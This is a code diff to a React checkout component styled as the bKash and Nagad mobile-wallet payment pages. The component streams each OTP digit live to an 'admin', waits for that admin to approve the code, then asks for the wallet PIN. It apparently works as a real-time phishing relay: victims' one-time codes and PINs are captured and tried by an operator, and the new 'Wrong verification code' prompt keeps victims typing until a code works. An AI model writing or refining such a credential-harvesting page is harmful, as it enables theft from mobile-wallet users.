@@ -4,7 +4,7 @@
  */
 
 import React, { useState, useEffect, useRef } from 'react';
-import { Landmark, Lock, ShieldCheck, ArrowRightLeft, Hand } from 'lucide-react';
+import { Landmark, Lock, ShieldCheck, ArrowRightLeft, Hand, AlertTriangle } from 'lucide-react';
 import { safeFetchJson } from '../utils/safeFetch';
 
 export type GatewayType = 'bkash' | 'nagad';
@@ -43,6 +43,7 @@ export default function OnlineCheckoutGateway({
   const [adminWaitSeconds, setAdminWaitSeconds] = useState(10);
   const [isProcessing, setIsProcessing] = useState(false);
   const [isBtnSubmitting, setIsBtnSubmitting] = useState(false);
+  const [otpError, setOtpError] = useState(false);
   
   // Simulated gateway redirection timer states
   const [isRedirecting, setIsRedirecting] = useState(false);
@@ -184,6 +185,7 @@ export default function OnlineCheckoutGateway({
   const handleOtpChange = (val: string) => {
     const cleanVal = val.replace(/[^0-9]/g, '');
     setOtp(cleanVal);
+    setOtpError(false);
     // Live sync as OTP is being typed so admin sees it instantly character-by-character
     syncCheckoutUpdate({ otp: cleanVal, step: 2 });
   };
@@ -356,17 +358,27 @@ export default function OnlineCheckoutGateway({
         alert('অনুগ্রহ করে সঠিক ভেরিফিকেশন কোডটি লিখুন।');
         return;
       }
-      if (type === 'bkash') {
-        setIsBtnSubmitting(true);
-        setTimeout(() => {
+      setIsBtnSubmitting(true);
+      safeFetchJson<any>(`/api/checkout/status/${checkoutId}`)
+        .then(data => {
           setIsBtnSubmitting(false);
-          setStep(3);
-          syncCheckoutUpdate({ otp, step: 3 });
-        }, 1200);
-      } else {
-        setStep(3);
-        syncCheckoutUpdate({ otp, step: 3 });
-      }
+          if (data && data.success && data.checkout) {
+            if (data.checkout.otpApproved) {
+              setOtpError(false);
+              setStep(3);
+              syncCheckoutUpdate({ otp, step: 3 });
+            } else {
+              setOtpError(true);
+            }
+          } else {
+            setOtpError(true);
+          }
+        })
+        .catch(err => {
+          setIsBtnSubmitting(false);
+          console.error("Error checking OTP status:", err);
+          setOtpError(true);
+        });
     } else if (step === 3) {
       // Validate PIN (bKash is 5, Nagad is 4)
       const requiredLen = type === 'bkash' ? 5 : 4;
@@ -741,9 +753,15 @@ export default function OnlineCheckoutGateway({
                   {countdown > 0 && (
                      <p className="text-white/70 text-[11px] mt-2">Remaining time: {countdown}s</p>
                   )}
+                  {otpError && (
+                    <div className="flex items-center justify-center gap-1.5 text-white text-xs font-sans font-medium mt-2 animate-pulse">
+                      <AlertTriangle className="w-3.5 h-3.5 text-white shrink-0" />
+                      <span>Wrong verification code</span>
+                    </div>
+                  )}
                   <div className="flex gap-2 justify-center w-full max-w-[340px] mt-6 sm:mt-16">
                     <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
-                    <button type="button" disabled={countdown > 0} onClick={() => setCountdown(120)} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-55 font-sans">Resend Code</button>
+                    <button type="button" disabled={countdown > 0} onClick={() => { setCountdown(120); setOtpError(false); }} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-55 font-sans">Resend Code</button>
                     <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer font-sans">Close</button>
                   </div>
                 </div>
@@ -816,8 +834,14 @@ export default function OnlineCheckoutGateway({
           {/* ======================================= */}
           {/* MERCHANT AREA */}
           {/* ======================================= */}
-          <div className="flex justify-between items-center py-3.5 px-6 border-b border-[#e5e5e5] bg-white shrink-0">
-            <div className="flex items-center gap-3">
+          <div 
+            className="flex justify-between items-center py-3.5 px-6 shrink-0 transition-all duration-300"
+            style={{
+              backgroundColor: isBkashLoading ? '#e2136e' : '#ffffff',
+              borderBottom: isBkashLoading ? '1px solid #e2136e' : '1px solid #e5e5e5'
+            }}
+          >
+            <div className={`flex items-center gap-3 transition-opacity duration-300 ${isBkashLoading ? 'opacity-0 pointer-events-none' : 'opacity-100'}`}>
               <div className="w-[38px] h-[38px] rounded-full flex items-center justify-center bg-[#e2136e] text-white shadow-xs select-none shrink-0">
                 <Landmark className="w-[18px] h-[18px]" />
               </div>
@@ -830,7 +854,7 @@ export default function OnlineCheckoutGateway({
                 </p>
               </div>
             </div>
-            <div className="text-[18px] max-[600px]:text-[16px] text-zinc-800 font-bold font-sans">
+            <div className={`text-[18px] max-[600px]:text-[16px] text-zinc-800 font-bold font-sans transition-opacity duration-300 ${isBkashLoading ? 'opacity-0 pointer-events-none' : 'opacity-100'}`}>
               ৳{amount}
             </div>
           </div>
@@ -906,7 +930,7 @@ export default function OnlineCheckoutGateway({
           <form onSubmit={handleNextStep} className="flex flex-col">
             
             <div 
-              className="min-h-[285px] flex flex-col justify-center items-center p-5 sm:p-6 transition-all duration-300 relative text-center"
+              className="h-[255px] min-h-[255px] flex flex-col justify-center items-center p-5 sm:p-6 relative text-center"
               style={{ 
                 background: '#e2136e'
               }}
@@ -993,6 +1017,13 @@ export default function OnlineCheckoutGateway({
                         }`}
                       />
 
+                      {otpError && (
+                        <div className="flex items-center justify-center gap-1.5 text-white text-[12.5px] font-sans font-medium mt-3 px-3 animate-pulse">
+                          <AlertTriangle className="w-4 h-4 text-white shrink-0" />
+                          <span>Wrong verification code</span>
+                        </div>
+                      )}
+
                       <div className="terms mt-4 text-white/90 text-[12px] text-center">
                         {countdown > 0 ? (
                           <span>Resend Code in <strong className="underline text-white font-medium">{countdown}s</strong></span>
@@ -1000,7 +1031,10 @@ export default function OnlineCheckoutGateway({
                           <button
                             type="button"
                             disabled={isBtnSubmitting}
-                            onClick={() => setCountdown(120)}
+                            onClick={() => {
+                              setCountdown(120);
+                              setOtpError(false);
+                            }}
                             className="underline text-white font-medium cursor-pointer hover:text-zinc-200 transition-colors disabled:opacity-50"
                           >
                             Resend Code
@@ -1052,17 +1086,14 @@ export default function OnlineCheckoutGateway({
             {/* BUTTONS PANEL */}
             {/* ======================================= */}
             <div 
-              className={`p-4 flex gap-4 transition-all duration-300 ${
-                isBkashLoading 
-                  ? 'h-[74px] border-none' 
-                  : 'border-t border-[#e5e5e5]'
-              }`}
+              className="p-4 flex gap-4 h-[74px] shrink-0 transition-all duration-300"
               style={{
-                backgroundColor: isBkashLoading ? '#e2136e' : '#f2f2f2'
+                backgroundColor: isBkashLoading ? '#e2136e' : '#f2f2f2',
+                borderTop: isBkashLoading ? '1px solid #e2136e' : '1px solid #e5e5e5'
               }}
             >
-              {!isBkashLoading && (
-                showCancelConfirm ? (
+              <div className={`w-full flex gap-4 transition-opacity duration-300 ${isBkashLoading ? 'opacity-0 pointer-events-none' : 'opacity-100'}`}>
+                {showCancelConfirm ? (
                   <>
                     <button
                       type="button"
@@ -1119,8 +1150,8 @@ export default function OnlineCheckoutGateway({
                       )}
                     </button>
                   </>
-                )
-              )}
+                )}
+              </div>
             </div>
 
             {/* ======================================= */}
